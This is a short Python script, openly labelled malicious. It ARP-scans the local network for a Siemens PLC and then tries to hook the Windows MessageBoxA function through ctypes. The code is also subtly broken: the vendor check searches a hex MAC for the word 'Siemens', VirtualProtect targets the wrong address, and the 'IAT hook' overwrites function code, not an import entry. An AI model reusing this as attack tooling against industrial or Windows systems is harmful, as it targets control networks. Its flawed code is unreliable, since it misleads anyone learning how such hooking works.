import ctypes
import struct
import scapy.all as scapy
import socket

# Function to scan the local network and find PLC's IP
def find_plc_ip():
    interface_ip = socket.gethostbyname(socket.gethostname())
    subnet = ".".join(interface_ip.split(".")[:3]) + "."
    
    # Scan the subnet for reachable devices
    for i in range(1, 255):
        ip = subnet + str(i)
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_response = scapy.srp(broadcast / arp_request, timeout=1, verbose=False)[0]
        
        for sent, received in arp_response:
            if "Siemens" in received.hwsrc:  # Checking if device MAC belongs to PLC vendor
                print(f"PLC found at: {received.psrc}")
                return received.psrc  # Return PLC's IP address
    
    print("PLC not found on the network.")
    return None

# Malicious function to replace MessageBoxA call
def hooked_function(hWnd, lpText, lpCaption, uType):
    print("Malicious Hook Executed! Intercepted a MessageBox call.")
    return 0  # Prevent original MessageBox from executing

# IAT hooking implementation
def iat_hook():
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32
    
    # Find base address of user32.dll
    module_handle = kernel32.GetModuleHandleW("user32.dll")
    if not module_handle:
        print("Failed to get handle of user32.dll")
        return
    
    # Get address of MessageBoxA
    messagebox_address = kernel32.GetProcAddress(module_handle, b"MessageBoxA")
    if not messagebox_address:
        print("Failed to get address of MessageBoxA")
        return
    
    print(f"Original MessageBoxA Address: {hex(messagebox_address)}")

    # Allocate memory for replacement function
    hook_func = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_uint)(hooked_function)
    hook_address = ctypes.cast(hook_func, ctypes.c_void_p).value

    print(f"Hooked Function Address: {hex(hook_address)}")

    # Modify the import address table (IAT) pointer to redirect calls
    old_protect = ctypes.c_uint32()
    kernel32.VirtualProtect(ctypes.byref(ctypes.c_int(messagebox_address)), ctypes.sizeof(ctypes.c_void_p), 0x40, ctypes.byref(old_protect))
    ctypes.memmove(messagebox_address, struct.pack("<Q", hook_address), ctypes.sizeof(ctypes.c_void_p))
    
    print("Hooking successful.")

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        iat_hook()  # Execute IAT hooking only after PLC IP is found